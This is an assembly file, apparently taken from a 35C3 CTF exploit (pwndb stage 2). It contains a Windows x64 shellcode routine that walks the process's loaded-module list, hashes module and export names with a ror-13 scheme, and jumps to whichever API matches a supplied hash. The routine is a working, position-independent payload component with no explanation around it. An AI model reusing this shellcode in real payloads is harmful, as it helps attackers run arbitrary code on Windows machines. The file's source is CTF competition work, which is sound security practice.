// from https://github.com/niklasb/35c3ctf-challs/blob/master/pwndb/exploit/stage2.py
.intel_syntax noprefix
api_call:
  push r9                  
  push r8                  
  push rdx                 
  push rcx                 
  push rsi                 
  xor rdx, rdx             
  mov rdx, gs:[rdx+0x30]     
  mov rdx, [rdx+0x60]
  
  mov rdx, [rdx+24]        
  mov rdx, [rdx+32]        
  
next_mod:                  
  mov rsi, [rdx+80]        
  movzx rcx, word ptr [rdx+74] 
  
  xor r9, r9               
loop_modname:              
  xor rax, rax             
  lodsb                    
  cmp al, 'a'              
  jl not_lowercase         
  sub al, 0x20             
not_lowercase:             
  
  ror r9, 13              
  add r9, rax             
  loop loop_modname        
  
  push rdx                 
  push r9                  
  
  
  mov rdx, [rdx+32]        
  mov eax, dword ptr [rdx+60]  
  add rax, rdx             
  cmp word ptr [rax+24], 0x020B 
  
  
  
  jne get_next_mod1         
  mov eax, dword ptr [rax+136] 
  test rax, rax            
  jz get_next_mod1         
  add rax, rdx             
  push rax                 
  mov ecx, dword ptr [rax+24]  
  mov r8d, dword ptr [rax+32]  
  add r8, rdx              
  
get_next_func:             
  jrcxz get_next_mod       
  dec rcx                  
  mov esi, dword ptr [r8+rcx*4]
  add rsi, rdx             
  xor r9, r9               
  
loop_funcname:             
  xor rax, rax             
  lodsb                    
  ror r9, 13              
  add r9, rax             
  cmp al, ah               
  jne loop_funcname        
  
  add r9, [rsp+8]          
  cmp r9, r10            
  jnz get_next_func        
  
  
  pop rax                  
  mov r8d, dword ptr [rax+36]  
  add r8, rdx              
  mov cx, [r8+2*rcx]       
  mov r8d, dword ptr [rax+28]  
  add r8, rdx              
  mov eax, dword ptr [r8+4*rcx]
  add rax, rdx             
  
finish:
  pop r8                   
  pop r8                   
  pop rsi                  
  pop rcx                  
  pop rdx                  
  pop r8                   
  pop r9                   
  pop r10                  
  sub rsp, 32              
                           
  push r10                 
  jmp rax                  
  
get_next_mod:              
  pop rax                  
get_next_mod1:             
  pop r9                   
  pop rdx                  
  mov rdx, [rdx]           
  jmp next_mod             

